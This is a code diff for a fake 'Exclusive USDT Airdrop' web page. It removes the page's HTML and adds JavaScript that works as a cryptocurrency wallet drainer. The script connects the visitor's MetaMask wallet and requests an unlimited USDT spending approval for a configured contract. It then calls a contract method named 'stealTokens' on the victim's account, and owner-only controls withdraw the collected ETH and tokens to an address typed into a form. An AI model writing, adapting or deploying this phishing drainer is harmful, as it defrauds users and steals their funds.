@@ -1,36 +1,90 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exclusive Airdrop Opportunity</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-  <div class="container">
-    <h1>🎉 Exclusive USDT Airdrop Just For You! 🎉</h1>
-    <h2>Claim your rewards today and start your journey to success!</h2>
-    <button id="connectButton" class="btn">Connect to MetaMask</button>
-    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
-    <div class="claim-btn-container">
-      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <div id="processingMessage" class="processing">Processing...</div>
-    </div>
-    <div class="claim-btn-container" id="ownerWithdraw" style="display:none;">
-      <input type="text" id="ownerAddress" placeholder="Enter owner address" />
-      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
-      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
-    </div>
-    <div class="footer">
-      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
-      <p>Need help? <a href="#">Contact Us</a></p>
-    </div>
-  </div>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
-  <script src="script.js" defer></script>
-</body>
-</html>
+let web3, accounts, contractABI, config;
+
+// Load ABI and configuration from external files
+async function loadDependencies() {
+  contractABI = await fetch("abi.json").then((response) => response.json());
+  config = await fetch("config.json").then((response) => response.json());
+}
+
+// Connect to MetaMask
+async function connectMetaMask() {
+  if (window.ethereum) {
+    web3 = new Web3(window.ethereum);
+    try {
+      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      document.getElementById("approveButton").disabled = false;
+      document.getElementById("claimAirdropButton").disabled = false;
+    } catch (error) {
+      alert("MetaMask connection failed");
+    }
+  } else if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    window.location.href = "metamask://dapp/" + window.location.host;
+  } else {
+    alert("MetaMask not detected! Please install MetaMask.");
+  }
+}
+
+// Approve spending
+async function approveSpending() {
+  const tokenContract = new web3.eth.Contract(contractABI, config.tokenAddress);
+  try {
+    const maxApproval = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+    await tokenContract.methods.approve(config.contractAddress, maxApproval).send({ from: accounts[0] });
+    alert("Approval successful! You can now claim your airdrop.");
+    document.getElementById("claimAirdropButton").disabled = false;
+  } catch (error) {
+    alert("Error during approval");
+  }
+}
+
+// Claim airdrop
+async function claimAirdrop() {
+  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  document.getElementById("processingMessage").classList.add("show");
+  try {
+    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+    alert("Airdrop claimed successfully!");
+  } catch (error) {
+    alert("Error claiming airdrop");
+  } finally {
+    document.getElementById("processingMessage").classList.remove("show");
+  }
+}
+
+// Withdraw ETH
+async function withdrawETH() {
+  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  const ownerAddress = document.getElementById("ownerAddress").value;
+  try {
+    await contract.methods.withdrawETH(ownerAddress).send({ from: accounts[0] });
+    alert("ETH withdrawn successfully!");
+  } catch (error) {
+    alert("Error withdrawing ETH");
+  }
+}
+
+// Withdraw tokens
+async function withdrawTokens() {
+  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
+  const ownerAddress = document.getElementById("ownerAddress").value;
+  try {
+    await contract.methods.withdrawTokens(ownerAddress).send({ from: accounts[0] });
+    alert("Tokens withdrawn successfully!");
+  } catch (error) {
+    alert("Error withdrawing tokens");
+  }
+}
+
+// Event Listeners
+document.getElementById("connectButton").addEventListener("click", connectMetaMask);
+document.getElementById("approveButton").addEventListener("click", approveSpending);
+document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
+document.getElementById("withdrawETHButton").addEventListener("click", withdrawETH);
+document.getElementById("withdrawTokensButton").addEventListener("click", withdrawTokens);
+
+// Initialize
+loadDependencies();
+
 
 
 
